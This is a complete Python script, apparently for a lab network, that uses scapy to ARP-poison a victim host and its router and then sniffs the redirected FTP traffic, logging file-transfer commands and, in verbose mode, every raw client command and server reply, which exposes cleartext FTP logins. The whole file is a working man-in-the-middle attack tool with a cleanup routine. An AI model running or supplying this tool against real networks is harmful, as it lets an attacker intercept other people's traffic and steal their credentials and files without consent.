#!/usr/bin/env python3

from scapy.all import ARP, send, get_if_hwaddr, sniff
from io import BytesIO
import time
import argparse
import logging
import threading
import ftplib

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def restore_arp():
    print("[ARP POISONER] Restoring ARP tables...")
    correct_victim = ARP (
        op=2,
        pdst=VICTIM_IP,
        psrc=ROUTER_IP,
        hwdst=VICTIM_MAC,
        hwsrc=ROUTER_MAC
    )
    correct_router = ARP (
        op=2,
        pdst=ROUTER_IP,
        psrc=VICTIM_IP,
        hwdst=ROUTER_MAC,
        hwsrc=VICTIM_MAC
    )
    for i in range(1, 10):
        send(correct_router, verbose=False)
        send(correct_victim, verbose=False)
        time.sleep(0.5)
    print("[ARP POISONER] ARP tables restored.")

def arp_poison():
    print("[ARP POISONER] Poisoning ARP tables...")
    poison_victim = ARP(
        op=2,
        pdst=VICTIM_IP,
        psrc=ROUTER_IP,
        hwdst=VICTIM_MAC,
        hwsrc=ATTACKER_MAC
    )

    poison_router = ARP(
        op=2,
        pdst=ROUTER_IP,
        psrc=VICTIM_IP,
        hwdst=ROUTER_MAC,
        hwsrc=ATTACKER_MAC
    )
    send(poison_victim, verbose=False)
    send(poison_router, verbose=False)

def sniff_sniff(packet):
    if packet.haslayer('TCP'):
        if ((packet['IP'].src == VICTIM_IP and packet['IP'].dst == ROUTER_IP)
            or (packet['IP'].src == ROUTER_IP and packet['IP'].dst == VICTIM_IP)
            and (packet['TCP'].dport == 21 or packet['TCP'].sport == 21)):

            process_packet(packet)

def process_packet(packet):
    if packet.haslayer('Raw'):
        payload = packet['Raw'].load.decode('utf-8').strip()

        if not payload:
            return
        
        if payload.startswith('STOR ') or payload.startswith('RETR '):
                parts = payload.split(' ', 1)
                command = parts[0]

                if len(parts) > 1:
                    filename = parts[1].strip() 
                    print(f"\n[SNIFFER] File Transfer Detected!")
                    print(f"  > IP Source: {packet['IP'].src}")
                    print(f"  > Command: **{command}**")
                    print(f"  > Filename: **{filename}**")
                else:
                    print(f"\n[SNIFFER] Command {command} detected without filename.")
        if VERBOSE and payload:
            if packet['IP'].src == VICTIM_IP:
                print("[SNIFFER] VERBOSE: COMMAND CLIENT -> SERVER")
            else:
                print("[SNIFFER] VERBOSE: RESPONSE SERVER -> CLIENT")
            print(payload)


def attack():

    for i in range(5):
        arp_poison()
        time.sleep(0.5)

    print("[SNIFFER] Starting packet sniffing...")
    try:
        sniff(
            filter="tcp port 21 and host " + VICTIM_IP + " and host " + ROUTER_IP,
            prn=sniff_sniff,
            store=0,
            iface="eth0"
        )
    except KeyboardInterrupt:
        pass

parser = argparse.ArgumentParser()

parser.add_argument("-v", "--verbose", action="store_true")
parser.add_argument("router_ip")
parser.add_argument("router_mac")
parser.add_argument("victim_ip")
parser.add_argument("victim_mac")

args = parser.parse_args()

VERBOSE = args.verbose
ROUTER_IP = args.router_ip      # 172.20.0.3
ROUTER_MAC = args.router_mac    # e2:38:cc:57:da:ec
VICTIM_IP = args.victim_ip      # 172.20.0.10
VICTIM_MAC = args.victim_mac    # 62:b6:ac:8f:57:be

ATTACKER_MAC = get_if_hwaddr("eth0")

try:
    while True:
        attack()
        arp_poison()
except KeyboardInterrupt:
    print("\nStopped. Initiating cleanup...")
    restore_arp()
    exit(0)
except Exception as e:
    print(f"\n[FATAL ERROR] {e}")
    restore_arp()
    exit(1)




